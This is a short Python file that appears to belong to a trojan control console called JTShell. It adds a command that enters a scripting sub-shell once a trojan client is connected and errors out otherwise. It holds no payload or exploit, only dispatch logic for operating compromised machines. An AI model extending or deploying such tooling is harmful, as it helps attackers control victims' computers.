__author__ = 'Jonas'
from trojanshell import TrojanShell
from util import shellprint
from JTShell.util.error import ProcessError
from JTShell.util.message import Message
from scriptshell import ScriptShell


def run(process):
    shell = process.shell
    if isinstance(shell, TrojanShell):
        # checking whether there is a trojan connected to the shell
        if len(shell.client.cache) >= 1:
            shellprint(process, Message("process", "now entering script mode..."))
            # entering the sub shell of the script mode
            scriptshell = ScriptShell("scripts", shell)
            scriptshell.run()
            return "script shell has been successfully terminated"
        else:
            raise ProcessError("there is no trojan connected to enter script mode for")
